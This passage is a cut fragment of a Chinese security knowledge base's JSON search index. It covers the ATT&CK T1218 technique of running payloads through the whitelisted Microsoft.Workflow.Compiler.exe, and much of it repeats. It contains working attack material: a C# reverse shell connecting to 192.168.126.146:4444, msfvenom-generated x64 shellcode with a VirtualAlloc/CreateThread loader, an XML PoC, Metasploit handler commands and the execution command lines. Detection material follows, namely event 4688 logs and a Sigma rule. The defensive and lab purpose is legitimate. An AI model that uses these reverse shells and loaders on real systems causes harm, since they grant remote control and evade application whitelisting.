0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5, 0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba, 0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5, 0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9, 0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5, 0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41, 0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41, 0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31, 0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8, 0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40, 0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5, 0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c, 0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41, 0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 }; IntPtr AmnGaO = VirtualAlloc(0, (UInt32)QWKpWKhcs.Length, 0x3000, 0x04); Marshal.Copy(QWKpWKhcs, 0, (IntPtr)(AmnGaO), QWKpWKhcs.Length); IntPtr oXmoNUYvivZlXj = IntPtr.Zero; UInt32 XVXTOi = 0; IntPtr pAeCTf wBS = IntPtr.Zero; uint BnhanUiUJaetgy; bool iSdNUQK = VirtualProtect(AmnGaO, (uint)0x1000, (uint)0x20, out BnhanUiUJaetgy); oXmoNUYvivZlXj = CreateThread(0, 0, AmnGaO, pAeCTfwBS, 0, ref XVXTOi); WaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);} } \u6267\u884c\u76d1\u542c use exploit/multi/handler msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp msf exploit(multi/handler) > set lhost 192.168.126.146 msf exploit(multi/handler) > set lport 4444 msf exploit(multi/handler) > exploit \u6267\u884cpayload C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml 1.cs \u63a5\u53d7session \u8fdb\u7a0b\u610f\u5916\u7ec8\u6b62\uff0c\u672a\u83b7\u5f97\u4f1a\u8bdd\u3002 \u6d4b\u8bd5\u7559\u75d5 \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: #\u65b9\u6cd51 \u65b0\u8fdb\u7a0b ID:0xb18 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0 \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml add.tcp \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: #\u65b9\u6cd52 \u65b0\u8fdb\u7a0b ID:0x804 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0xe8 \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml 1.cs \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Microsoft Compiler status: experimental description: \u68c0\u6d4bMicrosoft\u5de5\u4f5c\u6d41\u7f16\u8bd1\u5668\u7684\u8c03\u7528\uff0c\u8be5\u7f16\u8bd1\u5668\u53ef\u80fd\u5141\u8bb8\u6267\u884c\u4efb\u610f\u65e0\u7b26\u53f7\u4ee3\u7801 tags: - attack.defense_evasion - attack.execution - attack.t1218 references: - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb logsource: category: process_creation product: windows detection: selection: Image: '*\\Microsoft.Workflow.Compiler.exe' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate MWC use (unlikely in modern enterprise environments) level: high \u5efa\u8bae \u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-001 https://attack.mitre.org/techniques/T1218/001/ \u57fa\u4e8e\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload\u7b2c\u516d\u5b63 https://micro8.gitbook.io/micro8/contents-1/71-80/76-ji-yu-bai-ming-dan-compiler.exe-zhi-hang-payload-di-liu-ji \u8fdc\u63a7\u514d\u6740\u4e13\u9898(43)-\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload http://sec.nmask.cn/article_content?a_id=1b5c0f6a2e669c7605d42fd88f3f90fb","title":"T1218-001-win-\u57fa\u4e8e\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#t1218-001-win-compilerexepayload","text":"","title":"T1218-001-win-\u57fa\u4e8e\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#attck","text":"\u8bb8\u591a\u8f6f\u4ef6\u5f00\u53d1\u76f8\u5173\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6267\u884c\u5404\u79cd\u5f62\u5f0f\u7684\u4ee3\u7801\u4ee5\u534f\u52a9\u5f00\u53d1\u3001\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u5408\u6cd5\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002\u7b7e\u540d\u540e\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c\u5e76\u901a\u8fc7\u53ef\u4fe1\u7684\u8fdb\u7a0b\u4ee3\u7406\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u6709\u6548\u5730\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u89e3\u51b3\u65b9\u6848\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_1","text":"Microsoft.Workflow.Comiler.exe\u662f.NET Framework\u9ed8\u8ba4\u81ea\u5e26\u7684\u4e00\u4e2a\u5b9e\u7528\u5de5\u5177\uff0c\u7528\u6237\u80fd\u591f\u4ee5XOML\u5de5\u4f5c\u6d41\u6587\u4ef6\u7684\u5f62\u5f0f\u63d0\u4f9b\u4e00\u4e2a\u5e8f\u5217\u5316\u5de5\u4f5c\u6d41\u6765\u6267\u884c\u4efb\u610f\u672a\u7b7e\u540d\u7684\u4ee3\u7801\u3002 Microsoft.Workflow.Comiler.exe\u9700\u8981\u4e24\u4e2a\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2aXML\u6587\u4ef6\uff08\u7531\u4e00\u4e2a\u5e8f\u5217\u5316CompilerInput\u5bf9\u8c61\u6784\u6210\uff09\u7684\u8def\u5f84\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f\u5199\u5165\u5e8f\u5217\u5316\u7f16\u8bd1\u7ed3\u679c\u7684\u6587\u4ef6\u8def\u5f84\u3002 \u8bf4\u660e\uff1aMicrosoft.Workflow.Compiler.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMicrosoft.Workflow.Compiler\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#1","text":"","title":"\u65b9\u6cd51"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#pocxml","text":"<?xml version=\"1.0\" encoding=\"utf\u20108\"?> <CompilerInput xmlns:i=\"http://www.w3.org/2001/XMLSchema\u2010instance\" xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler\" <files xmlns:d2p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"> <d2p1:string>add.tcp</d2p1:string> </files> <parameters xmlns:d2p1=\"http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler\"> <assemblyNames xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <compilerOptions i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <coreAssemblyFileName xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"></coreAssemblyFileName> <embeddedResources xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <evidence xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.Security.Policy\" i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <generateExecutable xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</generateExecutable> <generateInMemory xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">true</generateInMemory> <includeDebugInformation xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</includeDebugInformation> <linkedResources xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <mainClass i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <outputName xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"></outputName> <tempFiles i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <treatWarningsAsErrors xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</treatWarningsAsErrors> <warningLevel xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">\u20101</warningLevel> <win32Resource i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <d2p1:checkTypes>false</d2p1:checkTypes> <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode> <d2p1:compilerOptions i:nil=\"true\" /> <d2p1:generateCCU>false</d2p1:generateCCU> <d2p1:languageToUse>CSharp</d2p1:languageToUse> <d2p1:libraryPaths xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" i:nil=\"true\" /> <d2p1:localAssembly xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.Reflection\" i:nil=\"true\" /> <d2p1:mtInfo i:nil=\"true\" /> <d2p1:userCodeCCUs xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.CodeDom\" i:nil=\"true\" /> </parameters> </CompilerInput>","title":"POC.xml"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#addtcp","text":"using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Net; using System.Net.Sockets; using System.Workflow.Activities; public class Program : SequentialWorkflowActivity { static StreamWriter streamWriter; public Program() { using(TcpClient client = new TcpClient(\"192.168.126.146\", 4444)) { using(Stream stream = client.GetStream()) { using(StreamReader rdr = new StreamReader(stream)) { streamWriter = new StreamWriter(stream); StringBuilder strInput = new StringBuilder(); Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.CreateNoWindow = true; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardInput = true; p.StartInfo.RedirectStandardError = true; p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); p.Start(); p.BeginOutputReadLine(); while(true) { strInput.Append(rdr.ReadLine()); p.StandardInput.WriteLine(strInput); strInput.Remove(0, strInput.Length); } } } } } private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) { StringBuilder strOutput = new StringBuilder(); if (!String.IsNullOrEmpty(outLine.Data)) { try { strOutput.Append(outLine.Data); streamWriter.WriteLine(strOutput); streamWriter.Flush(); } catch (Exception err) { } } } }","title":"add.tcp"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_5","text":"use exploit/multi/handler msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp msf exploit(multi/handler) > set lhost 192.168.126.146 msf exploit(multi/handler) > set lport 4444 msf exploit(multi/handler) > exploit","title":"\u8bbe\u7f6e\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#payload","text":"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml add.tcp","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_6","text":"\u8fdb\u7a0b\u610f\u5916\u7ec8\u6b62\uff0c\u672a\u83b7\u5f97\u4f1a\u8bdd\uff0c\u5229\u7528\u65b9\u6cd52\u8fdb\u884c\u6d4b\u8bd5\u3002","title":"\u67e5\u770b\u4f1a\u8bdd"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#2","text":"","title":"\u65b9\u6cd52"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#msfshellcode","text":"msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp using System; using System.Workflow.Activities; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; class yrDaTlg : SequentialWorkflowActivity { [DllImport(\"kernel32\")] private static extern IntPtr VirtualAlloc(UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPt rDStOGXQMMkP, uint CzzIpcuQppQSTBJ, uint JCFImGhkRqtwANx, out uint exgVp Sg); [DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, ref UInt32 SZtdSB); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM); public yrDaTlg() { byte[] QWKpWKhcs = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48, 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9, 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41, 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48, 0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b, 0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b, 0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41, 0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1, 0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45, 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b, 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01, 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48, 0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9, 0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00, 0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5, 0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x7e,0x92,0x41,0x54,0x49,0x89,0xe4, 0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68, 0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a, 0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89, 0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5, 0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba, 0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5, 0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9, 0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5, 0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41, 0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41, 0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31, 0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8, 0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40, 0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5, 0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c, 0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41, 0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 }; IntPtr AmnGaO = VirtualAlloc(0, (UInt32)QWKpWKhcs.Length, 0x3000, 0x04); Marshal.Copy(QWKpWKhcs, 0, (IntPtr)(AmnGaO), QWKpWKhcs.Length); IntPtr oXmoNUYvivZlXj = IntPtr.Zero; UInt32 XVXTOi = 0; IntPtr pAeCTf wBS = IntPtr.Zero; uint BnhanUiUJaetgy; bool iSdNUQK = VirtualProtect(AmnGaO, (uint)0x1000, (uint)0x20, out BnhanUiUJaetgy); oXmoNUYvivZlXj = CreateThread(0, 0, AmnGaO, pAeCTfwBS, 0, ref XVXTOi); WaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);} }","title":"msf\u751f\u6210shellcode"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_7","text":"use exploit/multi/handler msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp msf exploit(multi/handler) > set lhost 192.168.126.146 msf exploit(multi/handler) > set lport 4444 msf exploit(multi/handler) > exploit","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#payload_1","text":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml 1.cs","title":"\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#session","text":"\u8fdb\u7a0b\u610f\u5916\u7ec8\u6b62\uff0c\u672a\u83b7\u5f97\u4f1a\u8bdd\u3002","title":"\u63a5\u53d7session"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_8","text":"\u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: #\u65b9\u6cd51 \u65b0\u8fdb\u7a0b ID:0xb18 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0 \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml add.tcp \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: #\u65b9\u6cd52 \u65b0\u8fdb\u7a0b ID:0x804 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0xe8 \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml 1.cs","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_9","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#sigma","text":"title: Microsoft Compiler status: experimental description: \u68c0\u6d4bMicrosoft\u5de5\u4f5c\u6d41\u7f16\u8bd1\u5668\u7684\u8c03\u7528\uff0c\u8be5\u7f16\u8bd1\u5668\u53ef\u80fd\u5141\u8bb8\u6267\u884c\u4efb\u610f\u65e0\u7b26\u53f7\u4ee3\u7801 tags: - attack.defense_evasion - attack.execution - attack.t1218 references: - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb logsource: category: process_creation product: windows detection: selection: Image: '*\\Microsoft.Workflow.Compiler.exe' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate MWC use (unlikely in modern enterprise environments) level: 